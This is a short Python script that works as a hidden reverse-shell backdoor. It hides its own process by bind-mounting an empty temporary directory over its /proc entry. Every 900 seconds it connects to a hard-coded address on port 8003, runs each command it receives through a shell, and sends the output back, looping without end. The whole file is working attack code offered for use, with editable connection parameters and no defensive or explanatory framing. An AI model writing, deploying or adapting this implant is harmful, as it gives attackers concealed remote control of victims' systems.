#!/usr/bin/python3

import os, socket, subprocess, string, time
import random as r
ch = string.ascii_uppercase + string.digits
token = "".join(r.choice(ch) for i in range(5))
pid = os.getpid()
os.system("mkdir /tmp/{0} && mount -o bind /tmp/{0} /proc/{1}".format(token,pid))

# Change parameters
host = "192.168.1.6"
port = 8003
delay= 900

def MakeConnection(h,p,d):
	try:
		time.sleep(d)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((h,p))
		while True:
			command = sock.recv(4096).decode("utf-8")
			if str(command).strip('\n') == 'exit':
				sock.close()
			proc = subprocess.Popen(
				command,
				shell=True,
				stdout=subprocess.PIPE, 
				stderr=subprocess.PIPE,)
			proc_result = proc.stdout.read() + proc.stderr.read()
			sock.sendall(proc_result)

	except socket.error:
		pass

while True:
	MakeConnection(host, port, delay)
